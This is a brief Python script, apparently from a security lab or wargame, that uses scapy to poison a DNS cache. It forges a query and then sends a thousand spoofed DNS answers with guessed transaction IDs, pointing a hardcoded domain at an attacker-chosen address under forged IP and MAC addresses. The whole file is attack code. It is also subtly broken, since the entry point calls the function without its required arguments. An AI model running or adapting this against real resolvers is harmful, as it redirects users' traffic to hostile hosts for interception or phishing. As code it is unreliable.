#!/usr/bin/env python

__author__ = "bt3gl"

from scapy.all import *
from scapy.layers.l2 import *
import time

def dns_poisoning(SPOOF_ADDR, TARGET):
    pkts = []
    for x in range (10000,11000):
        pkt = Ether(src="52:54:00:dd:01:50", dst="52:54:00:dd:01:49")/IP(dst=SPOOF_ADDR,\
            src=TARGET)/UDP(dport=4250)/DNS(id=x,an=DNSRR(rrname=url, type='A', rclass='IN', ttl=350, rdata=SPOOF_ADDR))
        pkts.append(pkt)
    dns = Ether(src="52:54:00:dd:01:38", dst="52:54:00:dd:01:49")/IP(dst=SPOOF_ADDR, \
        src="172.17.152.138")/UDP()/DNS(qd=DNSQR(qname=url))
    sendp(dns, verbose = 0)
    for pkt in pkts:
        sendp(pkt, verbose=0)

if __name__ == '__main__':
    url = "whenry_49094902fea7938f.propaganda.hc"
    SPOOF_ADDR = '23.235.46.133'
    TARGET = '192.168.1.125'
    dns_poisoning()
